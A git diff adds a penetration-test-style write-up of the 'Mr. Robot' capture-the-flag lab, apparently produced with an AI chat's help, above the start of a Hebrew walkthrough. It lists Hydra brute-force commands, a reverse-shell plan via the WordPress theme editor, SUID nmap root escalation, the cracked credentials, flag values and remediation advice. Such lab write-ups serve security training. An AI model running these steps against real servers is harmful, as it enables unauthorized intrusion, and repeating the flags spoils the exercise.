@@ -2,6 +2,155 @@
 
 
 
+<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/803fbedc-3e53-4f1e-8fff-c227739a4619" />
+
+
+This is a comprehensive breakdown of your **Mr. Robot CTF** walkthrough, formatted as a professional **Penetration Testing Report**. I have translated and adapted your findings into the required professional English structure, focusing on executive impact, technical depth, and remediation.
+
+---
+
+# Penetration Test Report: Mr. Robot CTF
+**Target IP:** 10.114.168.48 / 10.112.177.29  
+**Date:** April 4, 2026  
+**Author:** [Your Name]  
+**Status:** Final Report
+
+---
+
+## 1. Executive Summary
+This report details a full-stack security assessment of the "Mr. Robot" server. The evaluation revealed critical vulnerabilities ranging from sensitive information disclosure to broken authentication and insecure system configurations. 
+
+The primary security failure stemmed from an outdated WordPress installation with weak administrative credentials, allowing for **Remote Code Execution (RCE)**. Furthermore, a misconfigured system binary with **SUID permissions** allowed an attacker to escalate privileges from a low-level service account to full **ROOT (Administrative)** control. 
+
+**Risk Level: CRITICAL.** An external attacker could fully compromise the server, exfiltrate all data, and use the infrastructure for further malicious activities. Immediate patching and credential rotation are required.
+
+---
+
+## 2. Vulnerability Table
+
+| ID | Severity | Vulnerability Name | Status |
+|:---|:---|:---|:---|
+| 01 | Medium | Sensitive Information Disclosure (robots.txt) | Open |
+| 02 | High | Broken Authentication (WordPress Brute Force) | Open |
+| 03 | Critical | Remote Code Execution (via Theme Editor) | Open |
+| 04 | Critical | Privilege Escalation (Insecure SUID Binary) | Open |
+
+---
+
+## 3. Technical Deep Dive
+
+### 3.1 Information Disclosure & Enumeration
+**Description:** The application's `robots.txt` file contained entries pointing to sensitive files not intended for public access, including a custom dictionary file.
+
+**Impact:** Attackers can gather specific intelligence about the system environment and obtain wordlists tailored for brute-force attacks.
+
+**Proof of Concept (PoC):**
+Accessing `http://<TARGET_IP>/robots.txt` revealed:
+```text
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+```
+The dictionary `fsocity.dic` was downloaded and optimized for a brute-force attack:
+```bash
+# Removing duplicate entries to increase attack efficiency
+sort fsocity.dic | uniq > fs-list.txt
+wc -w fs-list.txt
+# Output: 11451 unique words
+```
+
+
+
+---
+
+### 3.2 Broken Authentication (WordPress)
+**Description:** The WordPress login interface (`/wp-login.php`) did not implement rate limiting or account lockout, making it susceptible to automated brute-force attacks.
+
+**Impact:** Unauthorized access to the WordPress Dashboard, allowing attackers to modify site content and underlying code.
+
+**Proof of Concept (PoC):**
+Using **Hydra** to identify the username and subsequently the password:
+```bash
+# Step 1: Username Enumeration
+hydra -L fs-list -p test <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
+
+# Result: User "elliot" identified.
+
+# Step 2: Password Cracking
+hydra -l elliot -P fs-list <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered"
+
+# Result: Credentials found -> elliot:ER28-0652
+```
+
+---
+
+### 3.3 Remote Code Execution (Initial Access)
+**Description:** The administrative "Theme Editor" allowed the modification of PHP files. By injecting a malicious payload into the `404.php` template, a Reverse Shell was triggered.
+
+**Impact:** Direct command execution on the server under the `daemon` service account.
+
+**Proof of Concept (PoC):**
+1. Navigated to **Appearance > Editor > 404.php**.
+2. Replaced the code with a PHP Reverse Shell payload pointing to the attacker's IP (`192.168.203.195`) on port `4444`.
+3. Established a listener on the attacker machine:
+```bash
+nc -lvnp 4444
+```
+4. Triggered the shell by browsing to: `http://<TARGET_IP>/wp-content/themes/twentyfifteen/404.php`.
+5. Upgraded to an interactive TTY:
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+### 3.4 Privilege Escalation (SUID Nmap)
+**Description:** The `nmap` binary was found with the SUID bit set, owned by **root**. This specific version of Nmap includes an "interactive mode" that allows users to execute shell commands with the file owner's privileges.
+
+**Impact:** Complete system takeover. Any user can escalate themselves to **root**.
+
+**Proof of Concept (PoC):**
+Identification of SUID binaries:
+```bash
+find / -perm -u=s -type f 2>/dev/null
+# Found: /usr/local/bin/nmap
+```
+
+
+Exploitation via **GTFOBins** method:
+```bash
+# Entering Nmap interactive mode
+nmap --interactive
+
+# Executing a root shell from within Nmap
+nmap> !sh
+
+# Verification
+id
+# Output: uid=0(root) gid=0(root)
+```
+Final flags were exfiltrated:
+* **Key 2:** `822c73956184f694993bede3eb39f959`
+* **Key 3:** `04787ddef27c3dee1ee161b21670b4e4`
+
+---
+
+## 4. Remediation Plan
+
+1. **Information Disclosure:** Remove sensitive filenames from `robots.txt` and move administrative files to non-predictable directories.
+2. **WordPress Security:** * Update WordPress core and all plugins to the latest versions.
+    * Implement **Multi-Factor Authentication (MFA)** for all users.
+    * Install a Web Application Firewall (WAF) or plugin (e.g., Wordfence) to limit login attempts.
+3. **Insecure Configurations:** * Conduct an audit of all SUID/SGID files. Remove the SUID bit from binaries like `nmap` that do not require it for standard users (`chmod u-s /usr/local/bin/nmap`).
+    * Disable the "Theme Editor" and "Plugin Editor" in WordPress by adding `define( 'DISALLOW_FILE_EDIT', true );` to `wp-config.php`.
+4. **Credential Management:** Change all passwords for system users and WordPress administrators immediately.
+
+---
+
+**End of Report.**
+
+
+
 שלב 1: איסוף מידע וסריקת רשת (Reconnaissance)
 1.1 סריקת פורטים (Nmap)
 השלב הראשון בתהליך היה זיהוי שירותים פעילים על גבי שרת היעד. ביצעתי סריקת nmap הכוללת זיהוי גרסאות שירותים (-sV) והרצת סקריפטים ברירת מחדל (-sC) כדי למפות את שטח התקיפה.
